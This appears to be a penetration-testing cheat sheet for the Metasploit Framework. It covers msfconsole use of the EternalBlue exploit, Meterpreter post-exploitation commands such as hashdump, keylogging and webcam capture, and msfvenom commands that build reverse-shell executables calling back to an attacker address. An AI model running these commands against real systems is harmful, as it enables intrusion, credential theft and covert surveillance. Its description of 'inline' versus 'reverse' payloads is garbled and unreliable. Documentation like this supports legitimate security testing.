## Metasploit Framework

The Metasploit Framework is a powerful open-source penetration testing platform that enables security professionals to develop, test, and execute exploits against remote target systems. It comes with a vast database of exploits, payloads, and auxiliary modules, making it an indispensable tool for red team operations.

### Installation

Metasploit is pre-installed on Kali Linux and Parrot OS. For other systems, you can follow the official installation guide:

*   **Linux (Official Installer):**
    ```bash
    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \ 
    chmod 755 msfinstall && \ 
    ./msfinstall
    ```

### Basic Usage (msfconsole)

`msfconsole` is the primary interface for interacting with the Metasploit Framework.

*   **Start msfconsole:**
    ```bash
    msfconsole
    ```

*   **Search for Modules:** You can search for exploits, payloads, auxiliary modules, and post-exploitation modules.
    ```
    search <keyword>
    search type:exploit platform:windows cve:2017
    search name:eternalblue
    ```

*   **Use a Module:** Select a module to interact with.
    ```
    use exploit/windows/smb/ms17_010_eternalblue
    use auxiliary/scanner/smb/smb_version
    use payload/windows/meterpreter/reverse_tcp
    ```

*   **Show Options:** Display the configurable options for the currently selected module.
    ```
    show options
    ```

*   **Set Options:** Configure the module\`s parameters. Common options include `RHOSTS` (target IP), `LHOST` (attacker IP), `LPORT` (attacker port), `PAYLOAD`.
    ```
    set RHOSTS 192.168.1.100
    set LHOST 192.168.1.5
    set LPORT 4444
    set PAYLOAD windows/meterpreter/reverse_tcp
    ```

*   **Show Payloads:** List compatible payloads for the current exploit.
    ```
    show payloads
    ```

*   **Show Targets:** List available targets for the current exploit.
    ```
    show targets
    ```

*   **Run/Exploit:** Execute the module.
    ```
    exploit
    run
    ```

### Meterpreter (Post-Exploitation Shell)

Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection. It provides a powerful command-line interface for post-exploitation activities.

*   **Basic Meterpreter Commands:**
    *   `sysinfo`: Display system information.
    *   `getuid`: Get the current user ID.
    *   `pwd`: Print working directory.
    *   `ls`/`dir`: List directory contents.
    *   `cd`: Change directory.
    *   `upload <local_file> <remote_path>`: Upload a file to the target.
    *   `download <remote_file> <local_path>`: Download a file from the target.
    *   `shell`: Drop into a native system shell (cmd.exe or bash).
    *   `execute -f <program.exe>`: Execute a program.
    *   `ps`: List running processes.
    *   `migrate <pid>`: Migrate the Meterpreter session to another process.
    *   `getsystem`: Attempt to elevate privileges to SYSTEM.
    *   `hashdump`: Dump password hashes from the SAM database (Windows).
    *   `screenshot`: Take a screenshot of the target desktop.
    *   `keyscan_start`/`keyscan_dump`: Start/dump keystrokes.
    *   `webcam_list`/`webcam_snap`: List/snap webcam.

### Auxiliary Modules

Auxiliary modules perform various scanning, sniffing, and fuzzing tasks that are not directly exploits.

*   **Example Auxiliary Modules:**
    *   `auxiliary/scanner/smb/smb_login`: Brute-force SMB logins.
    *   `auxiliary/scanner/http/http_version`: Detect HTTP server versions.
    *   `auxiliary/scanner/ftp/ftp_version`: Detect FTP server versions.

### Payloads

Payloads are the code that runs on the target system after successful exploitation. Metasploit offers various types of payloads:

*   **Staged vs. Stageless:** Staged payloads are smaller and download the rest of the payload in stages, while stageless payloads are larger but self-contained.
*   **Inline vs. Reverse:** Inline payloads connect back to the attacker, while reverse payloads listen for incoming connections from the attacker.
*   **Non-Meterpreter Payloads:** Shells (cmd, bash), VNC, etc.

### Msfvenom (Payload Generation)

`msfvenom` is a standalone payload generator that combines `msfpayload` and `msfencode`.

*   **Generate a Windows Reverse TCP Meterpreter executable:**
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o /tmp/shell.exe
    ```
*   **Generate a Linux Reverse Shell ELF:**
    ```bash
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o /tmp/shell.elf
    ```
*   **Generate a Python Reverse Shell:**
    ```bash
    msfvenom -p python/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o /tmp/shell.py
    ```

Metasploit is a vast framework, and this documentation covers only the basics. For more in-depth usage, refer to the official Metasploit documentation and various online resources.

